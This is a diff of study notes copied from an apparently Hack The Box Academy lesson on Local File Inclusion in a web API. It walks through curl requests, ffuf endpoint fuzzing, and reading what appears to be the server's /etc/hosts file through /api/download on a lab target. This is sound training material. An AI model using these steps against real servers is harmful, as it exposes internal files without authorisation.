@@ -1,25 +1,23 @@
 ---
 sticker: emoji//1f480
 ---
-
-# Local File Inclusion (LFI)
-
-Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being `Apache Log Poisoning`. Our [File Inclusion](https://academy.hackthebox.com/module/details/23) module covers LFI in detail.
+Local File Inclusion (LFI) is an attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being `Apache Log Poisoning`. Our [File Inclusion](https://academy.hackthebox.com/module/details/23) module covers LFI in detail.
 
 Let us assess together an API that is vulnerable to Local File Inclusion.
 
-Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.
+Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.
 
-Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.
+Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.
 
 Let us first interact with it.
+
 
 ```shell-session
 smoothment@htb[/htb]$ curl http://<TARGET IP>:3000/api
 {"status":"UP"}
 ```
 
-We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using _ffuf_ and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.
+We don't see anything helpful except the indication that the API is up and running. Let us perform API endpoint fuzzing using _ffuf_ and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.
 
 ```shell-session
 smoothment@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
@@ -51,7 +49,7 @@ Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error::
 Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
 ```
 
-It looks like `/api/download` is a valid API endpoint. Let us interact with it.
+It looks like `/api/download` is a valid API endpoint. Let us interact with it.
 
 ```shell-session
 smoothment@htb[/htb]$ curl http://<TARGET IP>:3000/api/download
@@ -75,11 +73,10 @@ ff02::2 ip6-allrouters
 
 The API is indeed vulnerable to Local File Inclusion!
 
-## Question
+# Question
+---
 
-***
-
-![](gitbook/cybersecurity/images/Pasted%20image%2020250219171803.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219171803.png)
 
 We can do:
 
